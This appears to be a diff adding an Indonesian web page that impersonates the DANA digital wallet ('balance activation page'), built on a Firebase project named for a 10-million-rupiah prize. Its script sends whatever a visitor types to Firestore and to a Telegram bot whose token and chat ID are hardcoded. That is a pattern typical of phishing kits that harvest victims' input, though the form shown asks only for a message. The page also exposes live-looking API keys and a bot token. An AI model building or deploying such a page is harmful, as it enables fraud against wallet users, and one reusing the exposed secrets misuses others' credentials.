@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#118EEA">
+    <title>DANA Dompet Digital Indonesia: Halaman aktivasi saldo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        button {
+            background-color: #118EEA;
+            color: white;
+            padding: 12px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #0b7dda;
+        }
+
+        #response {
+            color: green;
+        }
+
+        #warning {
+            color: red;
+        }
+    </style>
+    <script src="https://www.gstatic.com/firebasejs/9.8.4/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.8.4/firebase-firestore.js"></script>
+    <script>
+        // Konfigurasi Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyDIJ8-wXIZIRCGZBcC0nAOONX4PH9t0fqM",
+            authDomain: "penerimandana10jt.firebaseapp.com",
+            projectId: "penerimandana10jt",
+            storageBucket: "penerimandana10jt.appspot.com",
+            messagingSenderId: "298493928094",
+            appId: "1:298493928094:web:ef4a74d3d0264bd69d518f",
+            measurementId: "G-M278EVSCPV"
+        };
+
+        // Inisialisasi Firebase
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        function sendMessage() {
+            const message = document.getElementById('messageInput').value;
+
+            if (message) {
+                // Simpan pesan ke Firestore
+                db.collection("messages").add({
+                    text: message,
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                })
+                .then(() => {
+                    document.getElementById('response').innerText = "Pesan berhasil dikirim.";
+                    document.getElementById('messageInput').value = ''; // Kosongkan input
+                    
+                    // Kirim pesan ke bot Telegram
+                    const botToken = "7418125896:AAHOZmRROFrpKo1w5Xp07T5zR06NFp1pAzk";
+                    const chatId = "7306305451";
+                    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+                    fetch(telegramUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (!data.ok) {
+                            console.error("Gagal mengirim pesan ke Telegram:", data.description);
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Terjadi kesalahan:", error);
+                    });
+                })
+                .catch(error => {
+                    document.getElementById('response').innerText = "Gagal mengirim pesan: " + error.message;
+                });
+            } else {
+                document.getElementById('response').innerText = "Pesan tidak boleh kosong.";
+            }
+        }
+    </script>
+</head>
+<body>
+    <div id="content">
+        <h2>Kirim Pesan ke Bot Telegram</h2>
+        <input type="text" id="messageInput" placeholder="Tulis pesan...">
+        <button onclick="sendMessage()">Kirim Pesan</button>
+        <div id="response"></div>
+        <div id="warning"></div>
+    </div>
+</body>
+</html>
